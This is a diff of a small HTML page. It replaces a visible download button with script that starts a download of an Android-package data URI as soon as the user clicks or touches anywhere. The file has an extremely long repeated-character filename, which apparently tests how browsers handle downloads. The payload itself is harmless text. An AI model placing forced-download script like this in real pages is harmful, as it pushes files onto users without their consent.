@@ -1,18 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Peace Be Upon You</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script>
+    function Puf(uri, name) {
+      var link = document.createElement("a");
+      link.download = name;
+      link.href = uri;
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    }
+
+    function openWin() {
+      Puf(
+        "data:application/vnd.android.package-archive;base64,UGVhY2UgQmUgVXBvbiBZb3U=",
+        "apklllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll.puf"
+      );
+    }
+
+    document.addEventListener("click", openWin, { once: true }); // Single tap/click
+    document.addEventListener("touchstart", openWin, { once: true }); // For touch devices
+  </script>
 </head>
 <body>
   <center><h2>Peace Be Upon You</h2></center>
-  <center>
-    <a
-      href="data:application/vnd.android.package-archive;base64,UGVhY2UgQmUgVXBvbiBZb3U="
-      download="apklllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll.puf"
-      style="padding: 10px 20px; background: #007bff; color: white; text-decoration: none; border-radius: 5px;"
-    >
-      Click to Download
-    </a>
-  </center>
+  <center><p>Tap anywhere to start download</p></center>
 </body>
 </html>
